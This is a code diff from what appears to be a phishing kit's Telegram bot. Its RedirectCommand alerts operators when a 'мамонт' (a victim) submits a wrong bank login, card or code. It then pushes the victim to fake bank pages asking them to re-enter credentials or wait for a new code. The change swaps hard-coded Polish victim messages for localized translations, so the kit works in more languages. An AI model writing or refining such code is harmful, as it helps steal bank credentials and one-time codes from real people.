@@ -5,11 +5,9 @@ namespace App\Telegram\Commands;
 use App\Events\RedirectEvent;
 use App\Models\Fake;
 use App\Models\Role;
-use App\Models\TelegramUser;
 use Log;
 use Telegram\Bot\Actions;
 use Telegram\Bot\Exceptions\TelegramSDKException;
-use Telegram\Bot\Keyboard\Keyboard;
 
 /**
  * Class HelpCommand.
@@ -46,29 +44,26 @@ class RedirectCommand extends BaseCommand
         $platform = platform($fake->category->name);
         try {
             $text = "⭐️ Мамонт ввел ";
+            $key = trim($url, '/');
+            $msg = $this->getArguments()['msg'] ?? trans("custom.redirect.$key", [], $fake->locale);
             switch ($url) {
                 case "/banks":
                     $text .= "неверный лк";
-                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane do swojej aplikacji bankowej(Login/Hasło)';
                     break;
                 case "/order":
                     $text .= "неверную карту";
-                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane swojej karty bankowej';
                     break;
                 case "/code":
                     $text .= "неверный код";
-                    $msgPL = 'Pan/Pani wpisał/a kod jaki już nie działa, albo kod jest napisany niepoprawnie. Prosimy zaczekać na nowy kod';
                     break;
                 case "/success":
                     $text = "страница успешно";
-                    $msgPL = 'Transakcja została dokonana';
                     break;
                 case "/push":
                     $text = "страница подтверждение";
-                    $msgPL = 'Potwierdzenie';
                     break;
                 default:
-                    $text = $msgPL = null;
+                    $text = $msg = null;
                     break;
             }
             if (!is_null($text)) foreach ($fake->allTakeUsers()->pluck('id')->toArray() as $id)
@@ -84,7 +79,7 @@ class RedirectCommand extends BaseCommand
         } catch (TelegramSDKException $e) {
             Log::error($e->getMessage());
         }
-        event(new RedirectEvent($fake, $uuid, $url, $this->getArguments()['msg'] ?? $msgPL));
+        event(new RedirectEvent($fake, $uuid, $url, $msg ?? ''));
         $update = $this->getUpdate();
         $message = $update->getMessage();
 
